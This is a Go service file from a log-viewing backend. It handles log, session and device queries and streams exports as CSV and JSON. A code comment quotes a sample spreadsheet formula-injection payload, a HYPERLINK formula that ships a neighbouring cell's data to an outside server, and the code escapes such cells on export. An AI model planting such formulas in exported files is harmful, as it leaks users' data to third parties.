package services

import (
	"context"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"time"

	"github.com/getcodescout/code_scout/internal/domain"
	"github.com/getcodescout/code_scout/internal/ports"
	"github.com/getcodescout/code_scout/pkg/cslog"
	"github.com/getcodescout/code_scout/pkg/search"
	"github.com/google/uuid"
)

type LogQueryService struct {
	repo ports.LogRepository
	// sessions is here rather than in a service of its own because every screen
	// that reads sessions is a dashboard read, the same as every screen that
	// reads logs, and the two are counted together on most of them.
	sessions ports.SessionRepository
}

func NewLogQueryService(repo ports.LogRepository, sessions ports.SessionRepository) *LogQueryService {
	return &LogQueryService{repo: repo, sessions: sessions}
}

// ListNetworkCalls returns one row per call, newest first.
func (s *LogQueryService) ListNetworkCalls(ctx context.Context, projectID uuid.UUID, f domain.NetworkFilter, limit int) ([]domain.NetworkCall, error) {
	return s.repo.ListNetworkCalls(ctx, projectID, f, limit)
}

// ListSessions returns app launches, newest first.
func (s *LogQueryService) ListSessions(ctx context.Context, projectID uuid.UUID, installationID *uuid.UUID, limit int) ([]domain.SessionSummary, error) {
	return s.sessions.List(ctx, projectID, installationID, limit)
}

// SessionCounts is the pair the Sessions toolbar shows.
func (s *LogQueryService) SessionCounts(ctx context.Context, projectID uuid.UUID) (int64, int64, error) {
	return s.sessions.Counts(ctx, projectID)
}

// ListDevices returns every install that has ever reported.
func (s *LogQueryService) ListDevices(ctx context.Context, projectID uuid.UUID, limit int) ([]domain.Device, error) {
	return s.sessions.ListDevices(ctx, projectID, limit)
}

// GetDevice is one install.
func (s *LogQueryService) GetDevice(ctx context.Context, projectID, installationID uuid.UUID) (*domain.Device, error) {
	return s.sessions.GetDevice(ctx, projectID, installationID)
}

// GetSession is one app launch, for the timeline's header.
func (s *LogQueryService) GetSession(ctx context.Context, projectID, sessionID uuid.UUID) (*domain.Session, error) {
	return s.sessions.GetByID(ctx, projectID, sessionID)
}

// ListLogs queries logs with search, filtering, and cursor-based pagination.
func (s *LogQueryService) ListLogs(ctx context.Context, projectID uuid.UUID, query string, cursor *domain.LogCursor, limit int) (*domain.LogListResult, error) {
	log := cslog.L(ctx)

	var filter domain.SearchFilter
	if query != "" {
		parsed, err := search.Parse(query)
		if err != nil {
			return nil, fmt.Errorf("invalid search query: %w", err)
		}
		filter = *parsed
	}

	opts := domain.LogListOpts{
		ProjectID: projectID,
		Filter:    filter,
		Cursor:    cursor,
		Limit:     limit,
	}

	result, err := s.repo.List(ctx, opts)
	if err != nil {
		log.WithError(err).Error("Failed to list logs")
		return nil, err
	}

	return result, nil
}

// GetLog is one log whole, for the MCP get_log tool: the untruncated fetch
// behind every "the list omitted this, go get it" flag.
func (s *LogQueryService) GetLog(ctx context.Context, projectID, logID uuid.UUID) (*domain.Log, error) {
	return s.repo.GetByID(ctx, projectID, logID)
}

// GetSessionTimeline returns all logs for a session in chronological order.
func (s *LogQueryService) GetSessionTimeline(ctx context.Context, projectID, sessionID uuid.UUID) ([]domain.Log, error) {
	log := cslog.L(ctx)

	logs, err := s.repo.GetBySessionID(ctx, projectID, sessionID, 500)
	if err != nil {
		log.WithError(err).Error("Failed to get session timeline")
		return nil, err
	}

	return logs, nil
}

// GetNetworkRequest returns the call's phases and the earliest linkedLimit of
// the logs the app linked to it, oldest first, with a count of all of the
// app's. domain.SplitCallLogs tells the two apart.
func (s *LogQueryService) GetNetworkRequest(ctx context.Context, projectID, requestID uuid.UUID, linkedLimit int) ([]domain.Log, int, error) {
	log := cslog.L(ctx)

	logs, linkedTotal, err := s.repo.GetByRequestID(ctx, projectID, requestID, linkedLimit)
	if err != nil {
		log.WithError(err).Error("Failed to get network request")
		return nil, 0, err
	}

	return logs, linkedTotal, nil
}

// GetLogStats returns aggregated log statistics for sparkline display.
func (s *LogQueryService) GetLogStats(ctx context.Context, projectID uuid.UUID, hours int) (*domain.LogStatsResult, error) {
	log := cslog.L(ctx)

	result, err := s.repo.GetStats(ctx, domain.LogStatsOpts{
		ProjectID: projectID,
		Hours:     hours,
	})
	if err != nil {
		log.WithError(err).Error("Failed to get log stats")
		return nil, err
	}

	return result, nil
}

// GetProjectOverview returns the counts behind the overview screen, over one
// range.
func (s *LogQueryService) GetProjectOverview(ctx context.Context, projectID uuid.UUID, window domain.OverviewWindow) (*domain.ProjectOverview, error) {
	overview, err := s.repo.GetOverview(ctx, projectID, window)
	if err != nil {
		cslog.L(ctx).WithError(err).Error("Failed to get project overview")
		return nil, err
	}
	return overview, nil
}

// GetTagCounts lists the tags in use on a project, for the log viewer's picker.
func (s *LogQueryService) GetTagCounts(ctx context.Context, projectID uuid.UUID, since *time.Time, limit int) ([]domain.TagCount, error) {
	counts, err := s.repo.GetTagCounts(ctx, projectID, since, limit)
	if err != nil {
		cslog.L(ctx).WithError(err).Error("Failed to get tag counts")
		return nil, err
	}
	return counts, nil
}

// GetErrorGroups returns the distinct problems on a project.
func (s *LogQueryService) GetErrorGroups(ctx context.Context, projectID uuid.UUID, since *time.Time, limit int) ([]domain.ErrorGroup, error) {
	groups, err := s.repo.GetErrorGroups(ctx, projectID, since, limit)
	if err != nil {
		cslog.L(ctx).WithError(err).Error("Failed to get error groups")
		return nil, err
	}
	return groups, nil
}

// csvSafeRow neutralises cells a spreadsheet would run rather than display.
//
// Excel, Sheets and LibreOffice all treat a cell beginning =, +, - or @ as a
// formula, and a log message is attacker-influenced text: whatever a user typed
// into a search box, a username, a string an API echoed back. Exported and
// opened, `=HYPERLINK("http://…"&A1,"ok")` quietly ships the row next to it to
// someone else's server, and the older DDE forms go further.
//
// A leading apostrophe is the standard answer: spreadsheets read it as "this is
// text" and do not display it. Applied to every column rather than the free
// text ones, because a uuid, an RFC3339 timestamp and a bool cannot begin with
// any of these characters, so it costs nothing and cannot be forgotten when a
// column is added.
func csvSafeRow(row []string) []string {
	for i, cell := range row {
		row[i] = csvSafeCell(cell)
	}
	return row
}

func csvSafeCell(cell string) string {
	if cell == "" {
		return cell
	}
	switch cell[0] {
	// Tab and carriage return are here because a spreadsheet skips them and
	// reads what follows, so they smuggle a formula past a check on the first
	// character alone.
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + cell
	}
	return cell
}

// ExportLogsCSV streams logs as CSV to the provided writer.
func (s *LogQueryService) ExportLogsCSV(ctx context.Context, projectID uuid.UUID, query string, w io.Writer) error {
	log := cslog.L(ctx)

	var filter domain.SearchFilter
	if query != "" {
		parsed, err := search.Parse(query)
		if err != nil {
			return fmt.Errorf("invalid search query: %w", err)
		}
		filter = *parsed
	}

	csvWriter := csv.NewWriter(w)
	defer csvWriter.Flush()

	// Write header
	if err := csvWriter.Write([]string{
		"id", "session_id", "level", "message", "error", "timestamp",
		"is_network_call", "request_id", "call_phase", "tags", "metadata",
	}); err != nil {
		return err
	}

	var cursor *domain.LogCursor
	for {
		result, err := s.repo.List(ctx, domain.LogListOpts{
			ProjectID: projectID,
			Filter:    filter,
			Cursor:    cursor,
			Limit:     200,
		})
		if err != nil {
			log.WithError(err).Error("Export: failed to fetch page")
			return err
		}

		for _, l := range result.Items {
			errStr := ""
			if l.Error != nil {
				errStr = *l.Error
			}
			reqID := ""
			if l.RequestID != nil {
				reqID = l.RequestID.String()
			}
			phase := ""
			if l.CallPhase != nil {
				phase = string(*l.CallPhase)
			}
			tags := ""
			if l.Tags != nil {
				tags = string(*l.Tags)
			}
			meta := ""
			if l.Metadata != nil {
				meta = string(*l.Metadata)
			}

			if err := csvWriter.Write(csvSafeRow([]string{
				l.ID.String(),
				l.SessionID.String(),
				l.Level,
				l.Message,
				errStr,
				l.TimeStamp.Format(time.RFC3339),
				fmt.Sprintf("%v", l.IsNetworkCall),
				reqID,
				phase,
				tags,
				meta,
			})); err != nil {
				return err
			}
		}

		csvWriter.Flush()

		if !result.HasMore {
			break
		}
		cursor = result.NextCursor
	}

	return nil
}

// exportLog is the JSON export shape: snake_case keys matching the ingestion
// contract (IncomingLog / CSV header), no server-internal fields.
type exportLog struct {
	ID            uuid.UUID         `json:"id"`
	SessionID     uuid.UUID         `json:"session_id"`
	Level         string            `json:"level"`
	Message       string            `json:"message"`
	Error         *string           `json:"error"`
	StackTrace    *json.RawMessage  `json:"stack_trace"`
	Metadata      *json.RawMessage  `json:"metadata"`
	Tags          *json.RawMessage  `json:"tags"`
	TimeStamp     time.Time         `json:"timestamp"`
	IsNetworkCall bool              `json:"is_network_call"`
	RequestID     *uuid.UUID        `json:"request_id"`
	CallPhase     *domain.CallPhase `json:"call_phase"`
}

// ExportLogsJSON streams logs as a JSON array to the provided writer.
func (s *LogQueryService) ExportLogsJSON(ctx context.Context, projectID uuid.UUID, query string, w io.Writer) error {
	log := cslog.L(ctx)

	var filter domain.SearchFilter
	if query != "" {
		parsed, err := search.Parse(query)
		if err != nil {
			return fmt.Errorf("invalid search query: %w", err)
		}
		filter = *parsed
	}

	// Write opening bracket
	if _, err := w.Write([]byte("[\n")); err != nil {
		return err
	}

	var cursor *domain.LogCursor
	first := true
	for {
		result, err := s.repo.List(ctx, domain.LogListOpts{
			ProjectID: projectID,
			Filter:    filter,
			Cursor:    cursor,
			Limit:     200,
		})
		if err != nil {
			log.WithError(err).Error("Export JSON: failed to fetch page")
			return err
		}

		for _, l := range result.Items {
			// Marshal before writing so a bad row (e.g. invalid RawMessage)
			// is skipped instead of truncating the stream mid-array.
			data, err := json.MarshalIndent(exportLog{
				ID:            l.ID,
				SessionID:     l.SessionID,
				Level:         l.Level,
				Message:       l.Message,
				Error:         l.Error,
				StackTrace:    l.StackTrace,
				Metadata:      l.Metadata,
				Tags:          l.Tags,
				TimeStamp:     l.TimeStamp,
				IsNetworkCall: l.IsNetworkCall,
				RequestID:     l.RequestID,
				CallPhase:     l.CallPhase,
			}, "  ", "  ")
			if err != nil {
				log.WithError(err).WithField("log_id", l.ID).Warn("Export JSON: skipping unmarshalable row")
				continue
			}
			if !first {
				if _, err := w.Write([]byte(",\n")); err != nil {
					return err
				}
			}
			if _, err := w.Write([]byte("  ")); err != nil {
				return err
			}
			if _, err := w.Write(data); err != nil {
				return err
			}
			first = false
		}

		if !result.HasMore {
			break
		}
		cursor = result.NextCursor
	}

	_, err := w.Write([]byte("\n]\n"))
	return err
}
